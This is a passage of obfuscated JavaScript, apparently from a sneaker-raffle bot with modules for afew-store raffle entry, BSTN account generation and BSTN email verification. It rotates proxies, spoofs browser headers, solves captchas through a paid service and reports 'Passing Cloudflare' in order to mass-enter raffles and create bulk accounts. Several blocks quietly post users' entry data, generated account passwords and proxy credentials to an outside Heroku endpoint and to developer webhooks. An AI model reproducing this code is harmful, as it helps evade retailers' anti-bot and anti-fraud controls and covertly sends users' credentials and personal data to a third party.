                        var _0x225b34 = Math['round'](Math['random']() * (_0x5a33bf['length'] - 0x1)), _0x310684 = _0x5a33bf[_0x225b34]['split'](':');
                    var _0x421a9b;
                    try {
                        _0x421a9b = await _0x1f8a8f['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x310684[0x0] + ':' + _0x310684[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x421a9b = await _0x1f8a8f['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x310684[0x0] + ':' + _0x310684[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x58da8d = JSON['parse'](_0x57b36f['readFileSync']('sizes.json', 'utf-8')), _0x398e13 = _0x579970[_0x9afd70]['Url'], _0x4cb577 = _0x579970[_0x9afd70]['Size'], _0x28a4d6;
                        async function _0x13585c() {
                            var _0x3328f7 = new _0x2b6e0b['CookieJar']();
                            console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x5f47e2;
                            let _0x10c4ca = {
                                'method': 'GET',
                                'cookieJar': _0x3328f7,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x310684[0x2] + ':' + _0x310684[0x3] + '@' + _0x310684[0x0] + ':' + _0x310684[0x1]
                            }, _0x45bb7b = _0x398e13['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x2cae59 = _0x45bb7b + '.json', _0x1bcdc0 = await _0x3d9190(_0x2cae59);
                            console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x3011f7 = _0x1bcdc0['data']['product']['variants'];
                            if (_0x4cb577 != 'RANDOM') {
                                if (_0x3011f7[0x1]['option1']['includes']('W')) {
                                    const _0x42c89e = _0x58da8d['women']['find'](_0xe1f59b => _0xe1f59b['EUsize'] === _0x4cb577);
                                    _0x42c89e && (_0x4cb577 = _0x42c89e['size']);
                                } else {
                                    if (_0x3011f7[0x1]['option1']['includes']('Y')) {
                                        const _0x40b2e0 = _0x58da8d['GS']['find'](_0x16fccd => _0x16fccd['EUsize'] === _0x4cb577);
                                        _0x40b2e0 && (_0x4cb577 = _0x40b2e0['size']);
                                    } else {
                                        const _0x4de233 = _0x58da8d['men']['find'](_0x4b248c => _0x4b248c['EUsize'] === _0x4cb577);
                                        _0x4de233 && (_0x4cb577 = _0x4de233['size']);
                                    }
                                }
                                for (var _0x65982e of _0x3011f7) {
                                    _0x65982e['option1'] == _0x4cb577 && (_0x5f47e2 = _0x65982e['id']);
                                }
                            } else {
                                var _0x4022ed = Math['round'](Math['random']() * (_0x3011f7['length'] - 0x1));
                                _0x5f47e2 = _0x3011f7[_0x4022ed]['id'];
                            }
                            console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3d9190('https://raffles.afew-store.com/cart/' + _0x5f47e2 + ':1'), _0x28a4d6 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x13585c();
                        } catch (_0x3eddae) {
                            if (_0x3eddae['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x3eddae);
                        }
                        const _0x331df6 = await _0x421a9b['newPage']();
                        await _0x331df6['setDefaultNavigationTimeout'](0x1d4c0), await _0x331df6['authenticate']({
                            'username': '' + _0x310684[0x2],
                            'password': '' + _0x310684[0x3]
                        }), await _0x331df6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x331df6['setRequestInterception'](!![]), _0x331df6['on']('request', _0x43cf9b => {
                            _0x43cf9b['resourceType']() === 'image' || _0x43cf9b['resourceType']() === 'font' || _0x43cf9b['resourceType']() === 'media' ? _0x43cf9b['abort']() : _0x43cf9b['continue']();
                        });
                        try {
                            await _0x331df6['goto'](_0x28a4d6, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x331df6['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x331df6['type']('#checkout_email', '' + _0x579970[_0x9afd70]['Email']), await _0x73bf2c(0x320), await _0x331df6['type']('#checkout_attributes_instagram', '' + _0x579970[_0x9afd70]['Follower']), await _0x73bf2c(0x320), await _0x331df6['select']('#checkout_shipping_address_country', '' + _0x579970[_0x9afd70]['Country']), await _0x331df6['waitForTimeout'](0x258), await _0x331df6['type']('#checkout_shipping_address_first_name', '' + _0x579970[_0x9afd70]['FirstName']), await _0x331df6['waitForTimeout'](0x320), await _0x331df6['type']('#checkout_shipping_address_last_name', '' + _0x579970[_0x9afd70]['LastName']), await _0x331df6['waitForTimeout'](0x2bc), await _0x331df6['type']('#checkout_shipping_address_address1', _0x579970[_0x9afd70]['Address1'] + '\x20' + _0x579970[_0x9afd70]['HouseNumber']), await _0x331df6['waitForTimeout'](0x2bc), await _0x331df6['type']('#checkout_shipping_address_address2', '' + _0x579970[_0x9afd70]['Address2']), await _0x331df6['waitForTimeout'](0x2bc), await _0x331df6['type']('#checkout_shipping_address_zip', '' + _0x579970[_0x9afd70]['Zip']), await _0x331df6['waitForTimeout'](0x2bc), await _0x331df6['type']('#checkout_shipping_address_city', '' + _0x579970[_0x9afd70]['City']), await _0x331df6['waitForTimeout'](0x2bc);
                        if (_0x579970[_0x9afd70]['State'] != '')
                            try {
                                const _0x14a41b = JSON['parse'](_0x57b36f['readFileSync']('States.json', 'utf8'));
                                await _0x73bf2c(0x1f4);
                                if (_0x579970[_0x9afd70]['State']['length'] > 0x2)
                                    for (let _0x5323cf of _0x14a41b) {
                                        if (_0x5323cf['Province'] == _0x579970[_0x9afd70]['State']) {
                                            await _0x331df6['select']('#checkout_shipping_address_province', _0x5323cf['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x331df6['select']('#checkout_shipping_address_province', _0x579970[_0x9afd70]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x73bf2c(0x1f4), console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x73bf2c(0x190), _0x331df6['evaluate'](() => {
                            const _0xb6092b = document['querySelector']('#continue_button');
                            for (var _0x1d8ca9 = 0x0; _0x1d8ca9 < 0x5; _0x1d8ca9++) {
                                if (_0xb6092b) {
                                    _0xb6092b['click'](), _0xb6092b['click']();
                                    break;
                                } else
                                    _0x73bf2c(0xfa0);
                            }
                        }), await _0x331df6['waitForTimeout'](0x9c4);
                        try {
                            await _0x331df6['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x331df6['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x52107b => _0x52107b['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x331df6['waitForTimeout'](0x7d0), console['log'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x331df6['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x73bf2c(0x3e8), await _0x331df6['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x18016f => _0x18016f['submit']()), await _0x73bf2c(0x3e8);
                        try {
                            await _0x331df6['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x331df6['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x182a2a => _0x182a2a['submit']());
                        try {
                            await _0x331df6['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x4f4cf2 = 'no', _0x5584d0(_0x579970[_0x9afd70], _0x53c461), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                                try {
                                    await _0x5cd94d(_0x1d78d4['webhook'], _0x144106['succesDEVMSG']);
                                } catch {
                                }
                            await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x144106['succesDEVMSG']), await _0x73bf2c(0xc8);
                            try {
                                await _0x5cd94d(_0x323e07, _0x144106['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x5c7ae6['replace']('#', ''),
                                    'module': _0x53c461['name'],
                                    'entrydata': JSON['stringify'](_0x1a928a),
                                    'proxy': '' + _0x5a33bf[_0x9afd70]
                                };
                                var _0x3ed9f9 = JSON['stringify'](prxdata);
                                let _0x25a0f4 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x3ed9f9, _0x25a0f4);
                            } catch (_0x113518) {
                            }
                        } catch (_0x48ba0c) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x5e9745) {
                        _0x5e9745['message']['includes']('selector') && (_0x5e9745 = 'Connection\x20Error');
                        console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20' + _0x5e9745)), _0x2219f7 = '' + _0x5e9745;
                        var _0xc5fd09 = await _0x1bd114(_0x579970[_0x9afd70], _0x53c461, 'dev', !![], _0x2219f7);
                        _0x144106['errorDEV'] = { 'embeds': [_0xc5fd09] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x144106['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x144106['errorDEV']), _0x4f4cf2 = 'yes';
                    } finally {
                        _0x421a9b && _0x421a9b['close']();
                        if (_0x4f4cf2 == 'yes' && _0x2c449c != 0x5 && _0x2219f7 != 'Size\x20Not\x20Found') {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x53c461['name'] + ']\x20Task\x20' + (_0x9afd70 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c449c + '\x20/\x205)')), _0x9afd70 = _0x9afd70 - 0x1, _0x2c449c = _0x2c449c + 0x1;
                            continue;
                        }
                        _0x4f4cf2 == 'yes' && _0x2c449c >= 0x5 && (_0x3fe3d2(_0x579970[_0x9afd70], _0x53c461), _0x4f4cf2 = 'no', _0x2c449c = 0x0);
                        if (_0x9afd70 + 0x1 == _0x579970['length']) {
                            await _0x73bf2c(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x1d78d4['AfewDelay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x48e5bc, _0x4414c7, _0x382e1c) {
                    var _0x113274 = _0x4414c7, _0x240a79 = 0x0;
                    for (var _0x4b1a45 = 0x0; _0x4b1a45 < _0x4414c7['length']; _0x4b1a45++) {
                        maxTasks = Number(_0x1d78d4['threads']);
                        while (_0x240a79 >= maxTasks) {
                            await _0x73bf2c(_0x1d78d4['delay']);
                        }
                        async function _0x307346(_0x2d1cdb, _0x1e2cae, _0x2e4d1c, _0x11bc4e, _0x4e6ff0) {
                            _0x240a79++, _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x1d78d4['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x343d8a;
                            try {
                                await _0x4b6344(_0x1e2cae, _0x11bc4e);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x3ec78c(_0x2d1cdb['name'] + '\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20/\x20' + _0x1e2cae['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                            var _0x50aa13 = await _0x1bd114(_0x1e2cae[_0x11bc4e], _0x2d1cdb, 'acc', ![]);
                            const _0x4eb219 = { 'succesDEVMSG': { 'embeds': [_0x50aa13] } }, _0x8cd179 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0xb54630 = Math['round'](Math['random']() * (_0x2e4d1c['length'] - 0x1)), _0x39d090 = _0x2e4d1c[_0xb54630]['split'](':'), _0x14f14b;
                            try {
                                _0x14f14b = await _0x1f8a8f['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x39d090[0x0] + ':' + _0x39d090[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x14f14b = await _0x1f8a8f['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x39d090[0x0] + ':' + _0x39d090[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x59efd0 = await _0x14f14b['newPage']();
                                await _0x59efd0['authenticate']({
                                    'username': '' + _0x39d090[0x2],
                                    'password': '' + _0x39d090[0x3]
                                }), console['log'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x59efd0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x59efd0['setRequestInterception'](!![]), _0x59efd0['on']('request', _0x167239 => {
                                    _0x167239['resourceType']() === 'image' ? _0x167239['abort']() : _0x167239['continue']();
                                });
                                try {
                                    await _0x59efd0['goto']('' + _0x8cd179), await _0x59efd0['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x59efd0['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x73bf2c(0x7d0), console['log'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x73bf2c(0x190), await _0x59efd0['waitForSelector']('#firstname'), await _0x59efd0['focus']('#firstname'), await _0x59efd0['keyboard']['down']('Control'), await _0x59efd0['keyboard']['press']('A'), await _0x73bf2c(0xc8), await _0x59efd0['keyboard']['up']('Control'), await _0x59efd0['keyboard']['press']('Backspace'), await _0x59efd0['type']('#firstname', _0x1e2cae[_0x11bc4e]['FirstName'], { 'delay': 0xf0 }), await _0x73bf2c(0x190), await _0x59efd0['focus']('#lastname'), await _0x59efd0['keyboard']['down']('Control'), await _0x59efd0['keyboard']['press']('A'), await _0x73bf2c(0xc8), await _0x59efd0['keyboard']['up']('Control'), await _0x59efd0['keyboard']['press']('Backspace'), await _0x59efd0['type']('#lastname', _0x1e2cae[_0x11bc4e]['LastName'], { 'delay': 0xe6 }), await _0x73bf2c(0x190), await _0x59efd0['focus']('#email_address'), await _0x59efd0['keyboard']['down']('Control'), await _0x59efd0['keyboard']['press']('A'), await _0x73bf2c(0xc8), await _0x59efd0['keyboard']['up']('Control'), await _0x59efd0['keyboard']['press']('Backspace'), await _0x59efd0['type']('#email_address', _0x1e2cae[_0x11bc4e]['Email'], { 'delay': 0x122 }), await _0x73bf2c(0x190), await _0x59efd0['type']('#password', _0x1e2cae[_0x11bc4e]['Password'], { 'delay': 0x82 }), await _0x73bf2c(0x1f4), await _0x59efd0['type']('#password-confirmation', _0x1e2cae[_0x11bc4e]['Password'], { 'delay': 0x7c }), console['log'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20Sending\x20Request'), await _0x73bf2c(0x2bc), await _0x59efd0['$eval']('#form-validate', _0x28b5a9 => _0x28b5a9['submit']()), await _0x73bf2c(0x1388);
                                const _0x40ce1e = await _0x59efd0['$']('#email_address-error');
                                if (_0x40ce1e)
                                    throw new Error('Invalid\x20Email');
                                const _0x26e954 = await _0x59efd0['$']('#password-error');
                                if (_0x26e954)
                                    throw new Error('Invalid\x20Password');
                                await _0x59efd0['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20Account\x20' + _0x1e2cae[_0x11bc4e]['Email'] + '\x20Generated')), _0x57b36f['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x1e2cae[_0x11bc4e]['Email'] + ',' + _0x1e2cae[_0x11bc4e]['Password']);
                                try {
                                    _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x4eb219['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5cd94d(_0x2ffc54, _0x4eb219['succesDEVMSG']);
                                let _0x441506 = _0x1e2cae[_0x11bc4e];
                                try {
                                    prxdata = {
                                        'username': _0x5c7ae6['replace']('#', ''),
                                        'module': _0x2d1cdb['name'],
                                        'entrydata': JSON['stringify'](_0x441506),
                                        'proxy': '' + _0x2e4d1c[_0x11bc4e]
                                    };
                                    var _0xead7b = JSON['stringify'](prxdata);
                                    let _0x2c8bdf = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0xead7b, _0x2c8bdf);
                                } catch (_0x277ff6) {
                                }
                                console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x542cb7) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20' + _0x542cb7)), _0x343d8a = '' + _0x542cb7;
                                var _0x29d410 = await _0x1bd114(_0x1e2cae[_0x11bc4e], _0x2d1cdb, 'acc', !![], _0x343d8a);
                                _0x4eb219['errorDEV'] = { 'embeds': [_0x29d410] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x4eb219['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x4eb219['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x14f14b)
                                    _0x14f14b['close']();
                                if (retry == 'yes' && _0x4e6ff0 != 0x5)
                                    return console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Task\x20' + (_0x11bc4e + 0x1) + '\x20:\x20Retrying\x20(' + (_0x4e6ff0 + 0x1) + '\x20/\x205)')), _0x240a79--, _0x4e6ff0 = _0x4e6ff0 + 0x1, _0x307346(_0x2d1cdb, _0x1e2cae, _0x2e4d1c, _0x11bc4e, _0x4e6ff0);
                                retry == 'yes' && _0x4e6ff0 >= 0x5 && (_0x3fe3d2(_0x1e2cae[_0x11bc4e], _0x2d1cdb), retry = 'no', _0x4e6ff0 = 0x0), _0x240a79--, console['log'](_0x4ea3c7() + '\x20[' + _0x2d1cdb['name'] + ']\x20Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                            }
                        }
                        _0x307346(_0x48e5bc, _0x113274, _0x382e1c, _0x4b1a45, 0x0), await _0x73bf2c(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2411f9, _0x19c57a) {
                    var _0x34ee0f = ![], _0xeab290 = [], _0x1cb0ec = 0x0;
                    async function _0x1d79b3() {
                        var _0x1cd691 = new _0x10db71({
                            'user': _0x1d78d4['masterMail'],
                            'password': _0x1d78d4['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4fbff2(_0x510a6d) {
                            _0x1cd691['openBox']('INBOX', ![], _0x510a6d);
                        }
                        _0x1cd691['once']('ready', function () {
                            _0x4fbff2(function (_0x542b2f, _0x53f3fc) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x542b2f)
                                    throw _0x542b2f;
                                _0x1cd691['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x18f374, _0xf9807c) {
                                    if (!_0xf9807c || !_0xf9807c['length'])
                                        console['log'](_0x4ea3c7() + '\x20[' + _0x2411f9['name'] + ']\x20No\x20mails\x20found'), _0x1cd691['end']();
                                    else {
                                        var _0x2ad773 = _0x1cd691['seq']['fetch'](_0xf9807c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2ad773['on']('message', function (_0x23f8e3, _0x16e5fd) {
                                            var _0x84c120 = '(#' + _0x16e5fd + ')\x20';
                                            _0x23f8e3['on']('body', function (_0x1ba8dd, _0x1b88c9) {
                                                _0xd18e10(_0x1ba8dd, (_0x34197e, _0x1aa580) => {
                                                    var _0x1d76c7 = _0x1aa580['text']['split']('customer/account/confirm/')[0x1], _0x2f988b = _0x1d76c7['split'](']')[0x0];
                                                    _0xeab290['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x2f988b);
                                                });
                                            }), _0x23f8e3['once']('end', function () {
                                            });
                                        }), _0x2ad773['once']('error', function (_0x551a6f) {
                                            console['log']('Fetch\x20error:\x20' + _0x551a6f), _0x34ee0f = !![];
                                        }), _0x2ad773['once']('end', function () {
                                            _0x1cd691['end'](), _0x34ee0f = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x1cd691['once']('error', function (_0xa532cc) {
                            console['log'](_0x11085b['red'](_0xa532cc['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x34ee0f = !![];
                        }), _0x1cd691['once']('end', async function () {
                            _0x34ee0f = !![];
                        }), _0x1cd691['connect']();
                    }
                    try {
                        _0x1d79b3();
                        while (!_0x34ee0f) {
                            await _0x73bf2c(0xfa0);
                        }
                        console['log']('Found\x20' + _0xeab290['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x73bf2c(0x7d0);
                    }
                    for (var _0x317131 = 0x0; _0x317131 < _0xeab290['length']; _0x317131++) {
                        maxTasks = Number(_0x1d78d4['threads']);
                        while (_0x1cb0ec >= maxTasks) {
                            await _0x73bf2c(_0x1d78d4['delay']);
                        }
                        async function _0x133668(_0x5ac994, _0x21fc8e, _0x45eec4, _0x5abfaf, _0x30d4f5) {
                            _0x1cb0ec++, _0x1f8a8f['use'](_0x2f231a());
                            if (_0x189f45 != 'yes')
                                var _0x189f45 = '', _0x30d4f5 = 0x0;
                            var _0x2208cf = Math['round'](Math['random']() * (_0x45eec4['length'] - 0x1)), _0x509318 = _0x45eec4[_0x2208cf]['split'](':'), _0x4f11a8;
                            try {
                                _0x4f11a8 = await _0x1f8a8f['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x509318[0x0] + ':' + _0x509318[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4f11a8 = await _0x1f8a8f['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x509318[0x0] + ':' + _0x509318[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x41bc29 = await _0x4f11a8['newPage']();
                                await _0x41bc29['authenticate']({
                                    'username': '' + _0x509318[0x2],
                                    'password': '' + _0x509318[0x3]
                                }), console['log'](_0x4ea3c7() + '\x20[' + _0x5ac994['name'] + ']\x20Task\x20' + (_0x5abfaf + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x41bc29['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x41bc29['setRequestInterception'](!![]), _0x41bc29['on']('request', _0x5dcde2 => {
                                    _0x5dcde2['resourceType']() === 'image' || _0x5dcde2['resourceType']() === 'font' || _0x5dcde2['resourceType']() === 'media' ? _0x5dcde2['abort']() : _0x5dcde2['continue']();
                                }), console['log'](_0x4ea3c7() + '\x20[' + _0x5ac994['name'] + ']\x20Task\x20' + (_0x5abfaf + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x41bc29['goto'](_0x21fc8e[_0x5abfaf]);
                                } catch (_0x3df71f) {
                                    _0x189f45 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x3df71f);
                                }
                                console['log'](_0x4ea3c7() + '\x20[' + _0x5ac994['name'] + ']\x20Task\x20' + (_0x5abfaf + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x41bc29['waitForTimeout'](0xbb8);
                                try {
                                    await _0x41bc29['waitForSelector']('.account-nav'), _0x189f45 = 'no', console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x5ac994['name'] + ']\x20Task\x20' + (_0x5abfaf + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x162a80 = await _0x1bd114(null, _0x5ac994, 'ver', ![]);
                                    const _0x389805 = { 'succesDEVMSG': { 'embeds': [_0x162a80] } };
                                    await _0x5cd94d(_0x5eff72, _0x389805['succesDEVMSG']);
                                } catch {
                                    _0x189f45 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x43932b) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5ac994['name'] + ']\x20Task\x20' + (_0x5abfaf + 0x1) + '\x20:\x20' + _0x43932b));
                                var _0x5d8eb4 = _0x43932b, _0x24037c = await _0x1bd114(null, _0x5ac994, 'ver', !![], _0x5d8eb4);
                                const _0x1a0cb6 = { 'errorDEVMSG': { 'embeds': [_0x24037c] } };
